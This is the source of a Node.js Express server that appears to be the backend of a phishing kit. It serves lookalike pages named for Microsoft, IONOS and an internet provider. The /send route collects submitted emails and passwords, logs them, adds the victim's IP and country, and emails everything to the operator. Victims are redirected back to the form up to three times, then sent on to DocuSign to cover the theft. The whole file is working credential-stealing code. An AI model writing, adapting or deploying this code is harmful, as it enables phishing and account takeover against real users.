import express from "express";
import bodyParser from "body-parser";
import nodemailer from "nodemailer";
import fetch from "node-fetch";
import path from "path";
import { fileURLToPath } from "url";
import dotenv from "dotenv";
import https from "https";
import fs from "fs";
import { randomUUID } from "crypto";

dotenv.config();

// For __dirname in ES module
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 443;

const httpsOptions = {
  key: fs.readFileSync(path.join(__dirname, "cert/kitshy.dpdns.org-key.pem")),
  cert: fs.readFileSync(path.join(__dirname, "cert/kitshy.dpdns.org-crt.pem")),
  ca: fs.readFileSync(path.join(__dirname, "cert/kitshy.dpdns.org-chain.pem"))
};

// Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// Route to serve the index.html file
app.get("/index", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// Route to serve the ionos.html file
app.get("/ionos", (req, res) => {
  res.sendFile(path.join(__dirname, "ionos.html"));
});


// Route to serve the microsoft.html file
app.get("/microsoft", (req, res) => {
  res.sendFile(path.join(__dirname, "microsoft.html"));
});

// Route to serve the  038_inet.html file
app.get("/038_inet", (req, res) => {
  res.sendFile(path.join(__dirname, "038_inet.html"));
});

// Debug: Log all env variables
console.log("ENV CONFIGURATION:");
console.log({
  SMTP_HOST: process.env.SMTP_HOST,
  SMTP_PORT: process.env.SMTP_PORT,
  SMTP_SECURE: process.env.SMTP_SECURE,
  SMTP_USER: process.env.SMTP_USER ? "*****" : undefined,
  TO_EMAIL: process.env.TO_EMAIL,
});

// Nodemailer transporter
const transporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST,
  port: parseInt(process.env.SMTP_PORT) || 465,
  secure: process.env.SMTP_SECURE === "true",
  auth: {
    user: process.env.SMTP_USER,
    pass: process.env.SMTP_PASS,
  },
});

// Verify transporter connection
transporter.verify((error, success) => {
  if (error) {
    console.error("SMTP Connection Error:", error);
  } else {
    console.log("SMTP Server is ready to send emails");
  }
});

// Track attempts per session
const sessions = {};

// POST route to handle form submission

app.post("/send", async (req, res) => {
  try {
    let { email, userpwd, sessionId, submissionPath } = req.body;

    // Generate sessionId if missing (fallback)
    if (!sessionId) {
      sessionId = randomUUID();
    }

    // Fallback for submissionPath
    submissionPath = submissionPath || req.headers.referer || req.originalUrl;

    // Track submission attempts per session
    let attempt = sessions[sessionId] || 0;
    attempt++;
    sessions[sessionId] = attempt;

    console.log("Form Submission Received:", { email, userpwd, sessionId, attempt, submissionPath });

    // Validate required fields
    if (!email || !userpwd) {
      return res.status(400).json({ success: false, message: "Email and password required." });
    }

    // Get client IP
    const ipRes = await fetch("https://api.ipify.org?format=json");
    const { ip } = await ipRes.json();

    // Get country from IP
    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=countryCode,country`);
    const geoData = await geoRes.json();
    const country = geoData.country || "Unknown";
    const countryCode = geoData.countryCode || "XX";

    // Prepare email
    const mailOptions = {
      from: `Capture <${process.env.SMTP_USER}>`,
      to: process.env.TO_EMAIL,
      subject: `New Submit Attempt #${attempt}`,
      html: `
        <h3>Details Captured</h3>
        <p><strong>Email:</strong> ${email}</p>
        <p><strong>Password:</strong> ${userpwd}</p>
        <p><strong>IP:</strong> ${ip}</p>
        <p><strong>Country:</strong> ${country} (${countryCode})</p>
        <p><strong>Attempt:</strong> ${attempt}</p>
        <p><strong>Submission Path:</strong> ${submissionPath}</p>
      `,
    };

    // Send email
    const info = await transporter.sendMail(mailOptions);
    console.log("Email sent:", info.messageId);

    // Serve the same page up to 3 times, then redirect externally
    if (attempt < 3) {
      res.redirect(submissionPath);
    } else {
      res.redirect("https://www.docusign.com/");
    }

  } catch (error) {
    console.error("Error in /send route:", error);
    res.status(500).send("Failed to process submission.");
  }
});

// Start server
https.createServer(httpsOptions, app).listen(PORT, () => {
  console.log(`HTTPS server running at https://0.0.0.0:${PORT}`);
});